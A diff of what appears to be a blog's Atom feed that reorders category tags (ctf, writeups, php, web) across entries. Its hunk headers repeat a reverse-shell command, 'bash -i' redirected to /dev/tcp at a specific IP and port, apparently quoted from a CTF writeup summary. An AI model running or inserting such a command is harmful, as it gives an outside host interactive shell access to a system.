@@ -181,11 +181,11 @@ ssh-keygen -t
     
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
     
-      <category term="web" scheme="https://www.virzz.com/tags/web/"/>
-    
       <category term="python" scheme="https://www.virzz.com/tags/python/"/>
     
       <category term="flask" scheme="https://www.virzz.com/tags/flask/"/>
+    
+      <category term="web" scheme="https://www.virzz.com/tags/web/"/>
     
       <category term="nginx" scheme="https://www.virzz.com/tags/nginx/"/>
     
@@ -421,9 +421,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
     
   </entry>
   
@@ -445,9 +445,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -468,9 +468,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -492,9 +492,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -515,9 +515,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -539,9 +539,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -563,9 +563,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -605,9 +605,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -629,9 +629,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
